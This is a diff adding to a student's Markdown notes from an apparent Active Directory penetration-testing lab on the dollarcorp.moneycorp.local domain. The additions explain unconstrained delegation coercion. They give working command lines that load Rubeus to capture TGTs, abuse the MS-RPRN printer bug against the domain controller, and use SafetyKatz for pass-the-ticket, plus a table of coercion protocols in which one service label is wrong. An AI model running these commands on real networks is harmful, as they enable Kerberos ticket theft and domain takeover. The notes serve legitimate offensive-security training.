@@ -19,6 +19,18 @@ Reuse the DA token with SafetyKatz
 C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args kerberos::ptt C:\Users\appadmin\Documents\user1\[0;2ceb8b3]-2-0-60a10000-Administrator@krbtgt-DOLLARCORP.MONEYCORP.LOCAL.kirbi
 ```
 
+### Unconstrained Delegation Coercion
+Coarse/Force machine accounts to connect to a machine and capture their TGT
+
+Use Rubeus on App server (`dcorp-appsrv`) to capture TGT of DC machine account
+```powershell
+C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/Rubeus.exe -args monitor /interval:5 /nowrap
+```
+
+Abuse printer bug to force the DC to connect to the App server
+```powershell
+C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/MS-RPRN.exe -args \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local
+```
 
 
 ### Theory
@@ -44,3 +56,19 @@ LSASS. This way the server can reuse the user's TGT to access any other
 resource as the user
 
 ![[Pasted image 20250514201409.png]]
+
+###  Theory Unconstrained Delegation Coercion
+Certain Microsoft services and protocols allow any authenticated user to
+force a machine to connect to a second machine
+
+As of January 2025, following protocols and services can be used for
+coercion
+
+| Protocol                     | Service        | Default on Server IS      | Ports Required |
+| ---------------------------- | -------------- | ------------------------- | -------------- |
+| MS-RPRN                      | Print Spooler  | Yes                       | 445 (SMB)      |
+| MS-WSP                       | Windows Search | No (Default on Client OS) | 445 (SMB)      |
+| MS-DFSNM (MDI detects this)) | Windows Search | No                        | 445 (SMB)      |
+We can force the dcorp-dcto connect to dcorp-appsrvby abusing the Printer bug (MS-RPRN) or if enabled, other services
+
+![[Pasted image 20250514202802.png]]
